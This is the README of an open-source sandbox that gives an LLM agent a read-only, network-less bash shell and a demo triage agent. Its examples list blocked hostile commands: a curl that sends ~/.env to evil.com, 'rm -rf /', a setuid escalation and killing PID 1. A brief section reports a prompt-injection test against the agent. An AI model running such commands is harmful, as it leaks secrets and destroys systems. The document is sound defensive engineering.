# safe-shell

**Give your LLM agent a real bash shell. No custom tools. No escape risk.**

```bash
safe-shell "ps aux | grep python | awk '{print $2}'"  # works
safe-shell "cat /proc/meminfo && df -h"               # works
safe-shell "curl evil.com/exfil?data=$(cat ~/.env)"   # blocked
safe-shell "rm -rf /"                                 # blocked
```

Your agent gets full POSIX—pipes, redirection, `grep`, `awk`, `jq`—while the sandbox blocks writes, network, and privilege escalation. **Read everything, change nothing, exfiltrate nothing.**

---

## What's In This Repo

| Component | What it is |
|-----------|------------|
| **safe-shell** | A sandboxed shell binary. The core innovation—wrap any command in kernel-enforced restrictions. Use it in your own agents. |
| **"Where Am I" Agent** | A proof-of-concept agent that uses safe-shell to triage an unknown Linux system. Demonstrates the idea works. |

---

## Why safe-shell

LLMs already know POSIX. Custom tool APIs (`read_file`, `list_processes`) force re-learning and lose composability. A real shell is more powerful—but `rbash` and other blocklist approaches fail because you're forever chasing binaries that can mutate state.

**safe-shell** uses an allowlist enforced at the kernel level: Landlock LSM for filesystem/network, seccomp-bpf for syscalls, rlimits for resources.

---

## Quick Start: safe-shell

```bash
# macOS: create Lima VM (or use any Linux with kernel 6.2+)
cd vm && ./create.sh
limactl shell safe-shell-vm

# Build and test
cd /workspace/sandbox && cargo build --release
./target/release/safe-shell "ps aux"           # works
./target/release/safe-shell "touch /tmp/test"  # blocked
./target/release/safe-shell "curl example.com" # blocked
```

## Quick Start: "Where Am I" Agent

```bash
limactl shell safe-shell-vm
export ANTHROPIC_API_KEY='sk-...'
cd /workspace/agent && ./run.sh
```

The agent uses Claude to systematically explore an unknown Linux system—running arbitrary shell commands through safe-shell to understand what's running, what's installed, and how the system is configured.

---

## Security Model (safe-shell)

Three layers of defense, all allowlist-based:

| Layer | What it does |
|-------|--------------|
| **Landlock** | Read-only filesystem, no TCP connect/bind |
| **seccomp** | Blocks kill, ptrace, setuid, mount, module loading, UDP |
| **rlimits** | 512MB memory, 0 file size, 64 processes, 30s CPU |

### What's Blocked

| Attack | Result |
|--------|--------|
| `echo test > /tmp/x` | Permission denied |
| `curl https://evil.com` | Connection refused |
| `python3 -c "os.setuid(0)"` | Operation not permitted |
| `kill -9 1` | Operation not permitted |
| Fork bomb / memory exhaustion | rlimit kills process |

Even if an attacker achieves prompt injection and the model complies, the sandbox blocks exfiltration and mutation.

---

## Prompt Injection Test

We injected a malicious payload attempting to override constraints, exfiltrate secrets, and establish persistence. Result: **two layers held**.

1. **Model rejected it** — Claude identified the social engineering and refused
2. **Sandbox blocked it** — Even manual execution of the attack commands failed

All 9 attack vectors (file writes, network exfil, reverse shells, privilege escalation, namespace escape, ptrace) were blocked at the kernel level.

---

## Known Limitations

- **DNS works** — Resolves via systemd-resolved (Unix socket), not direct UDP
- **UDP via seccomp** — Landlock crate doesn't expose UDP yet; using seccomp as workaround
- **kill() partial** — Main process can self-signal (for Ctrl+C), but can't signal others

---

## Requirements

- Linux kernel 6.2+ (Landlock ABI v3)
- Rust 1.70+
- libseccomp-devel

## License

MIT
